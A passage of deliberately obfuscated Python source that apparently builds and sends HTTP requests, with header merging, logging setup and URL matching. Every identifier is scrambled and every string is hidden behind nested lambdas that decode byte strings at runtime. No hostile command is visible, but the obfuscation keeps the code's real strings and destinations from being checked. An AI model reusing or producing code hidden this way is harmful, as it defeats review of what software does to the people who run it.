樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xca'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc9'))()]))))())())()}
                    elif method == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))()]))))())())():
                        data_orig = {(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xee'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())(): (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xca'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc9'))()]))))())())()}
                    if data == {}:
                        data = data_orig
                    else:
                        data_orig = dict(((k.lower(), v) for k, v in data_orig.items()))
                        data = dict(((k.lower(), v) for k, v in data.items()))
                        for i in data_orig:
                            if i in data:
                                continue
                            data[i] = data_orig[i]
                        new_data = {}
                        for i in data:
                            is_ = (lambda: (lambda 飁鐖枪锱兎酘: 飁鐖枪锱兎酘 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
                            new_i = ''
                            for j in str(i):
                                if is_:
                                    j = j.upper()
                                    is_ = (lambda: (lambda 璏暦廰匱忟棂: 璏暦廰匱忟棂 - (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
                                if j == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))()]))))())())():
                                    is_ = (lambda: (lambda 敏襕姭惑蚤鮞: 敏襕姭惑蚤鮞 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
                                new_i += j
                            new_data[new_i] = data[i]
                        data = dict(sorted(new_data.items()))
                    for i in data:
                        headers += (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xa6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xa3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))()]))))())())().format(i, data[i])
                襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())()).basicConfig(encoding=(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd1'))()]))))())())(), level=襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())()).DEBUG if debug else 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())()).INFO)
                if not 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).match((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x10'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc4'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))()]))))())())(), url):
